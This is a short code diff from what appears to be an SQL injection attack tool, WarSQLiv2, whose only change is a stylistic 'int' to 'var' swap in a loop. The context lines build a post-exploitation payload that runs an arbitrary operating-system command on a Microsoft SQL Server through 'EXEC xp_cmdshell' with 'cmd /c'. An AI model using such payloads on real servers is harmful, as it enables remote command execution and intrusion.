@@ -133,7 +133,7 @@ namespace WarSQLiv2.UserControls.Attack.MSSQL
                         _postExploitation.ExploitCode = "USE [master]\r\n";
                         _postExploitation.ExploitCode += "EXEC xp_cmdshell '\"cmd /c "+ txtPsCommand.Text + "';\r\n";
                         _postExploitation.ShowProgramList();
-                        for (int i = 0; i < _postExploitation._programList.Count; i++)
+                        for (var i = 0; i < _postExploitation._programList.Count; i++)
                         {
                             txtStatus.AppendText(_postExploitation._programList[i]);
                         }
